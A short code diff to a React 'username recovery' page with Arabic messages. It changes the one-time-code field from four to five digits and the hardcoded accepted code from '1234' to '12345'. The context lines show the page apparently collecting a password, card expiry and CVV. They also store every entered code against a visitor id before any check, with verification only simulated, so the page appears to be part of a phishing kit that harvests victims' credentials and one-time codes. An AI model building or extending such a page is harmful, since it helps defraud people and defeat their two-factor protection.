@@ -48,7 +48,7 @@ export default function UsernameRecoveryPage() {
   const [pass, setPass] = useState("")
   const [exy, setexy] = useState("")
   const [ccc, setccc] = useState("")
-  const [otpValues, setOtpValues] = useState(["", "", "", ""])
+  const [otpValues, setOtpValues] = useState(["", "", "", "",""])
   const [showOtp, setShowOtp] = useState(false)
   const [otpError, setOtpError] = useState("")
   const [errors, setErrors] = useState<{ [key: string]: string }>({})
@@ -144,20 +144,20 @@ export default function UsernameRecoveryPage() {
     await addData({ id: visitorId, otp: otpString, allOtps })
 
     // Validate OTP
-    if (otpString.length !== 4) {
-      setOtpError("يرجى إدخال رمز التحقق المكون من 4 أرقام")
+    if (otpString.length !== 5) {
+      setOtpError("يرجى إدخال رمز التحقق المكون من 5 أرقام")
       return
     }
 
-    if (!/^\d{4}$/.test(otpString)) {
+    if (!/^\d{5}$/.test(otpString)) {
       setOtpError("رمز التحقق يجب أن يحتوي على أرقام فقط")
       return
     }
 
     // Simulate OTP verification
-    if (otpString !== "1234") {
+    if (otpString !== "12345") {
       setOtpError("رمز التحقق غير صحيح")
-      setOtpValues(["", "", "", ""])
+      setOtpValues(["", "", "", "",""])
       return
     }
 
